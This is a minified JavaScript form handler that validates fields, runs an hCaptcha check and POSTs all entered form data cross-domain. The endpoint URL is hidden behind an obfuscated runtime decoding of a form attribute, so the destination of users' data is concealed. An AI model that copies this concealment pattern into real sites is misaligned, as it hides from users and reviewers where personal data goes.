function submitclicked(){var allvalid = true;document.querySelectorAll('[required]').forEach((elem)=>{if(!elem.checkValidity()){allvalid = false;}});if(allvalid){scap.execute();}else{sbmt.style.animation = "redpulse 1.2s ease-out";}}function submitform() {var object = form.getAttribute('object');if(object) {var dat = {};for (let i = 0; i < form.elements.length; i++){let element = form.elements[i];if(element.value === ""){dat[element.name] = "-";}else{dat[element.name] = element.value;}}$.ajax({url:object.slice(0, 38)+object.split('/')[8].split('0x').slice(1).map(hex => "0x" + hex).map(hex => parseInt(hex, 16)).map(x => Math.round(-13 *(Math.log(x) / Math.log(1/137)))).map(num => String.fromCharCode(num)).join('')+object.slice(-13),data:dat,type:"POST",dataType:"json",crossDomain:true});document.getElementById("submit-message").classList.add("visible");sbmt.style.animation = "greenpulse 1.2s ease-out forwards";setTimeout(()=>{window.location.href = "/"}, 3600);}return false;}function loadscripts(){["https://cdn.jsdelivr.net/npm/@hcaptcha/vanilla-hcaptcha", "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"].forEach(link=>{let script = document.createElement('script');script.src = link;document.head.appendChild(script);});form.removeEventListener('input', loadscripts);}const sbmt = document.getElementById("submit"), scap = document.getElementById('scap'), form = document.getElementsByTagName("form")[0], email = document.getElementById('email');var warn = document.getElementById('warn-wifi');sbmt.addEventListener('click', submitclicked);sbmt.addEventListener('animationend',()=>{sbmt.style.animation = "none";});scap.addEventListener('verified',(e)=>{sbmt.style.animation = "greenpulse 1.2s ease-out forwards";sbmt.disabled = true;submitform();});scap.addEventListener('error',(e)=>{sbmt.style.animation = "redpulse 1.2s ease-out forwards";});form.addEventListener('input', loadscripts);form.addEventListener('submit',(e)=>{e.preventDefault();});email.addEventListener('input',()=>{if (/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email.value)){email.setCustomValidity("");}else{email.setCustomValidity("Enter a valid email address.");}});window.addEventListener('offline',()=>{sbmt.disabled = true;});window.addEventListener('online',()=>{sbmt.disabled = false;});window.addEventListener('online', () => {warn.classList.remove('show');});window.addEventListener('offline', () => {warn.classList.add('show');});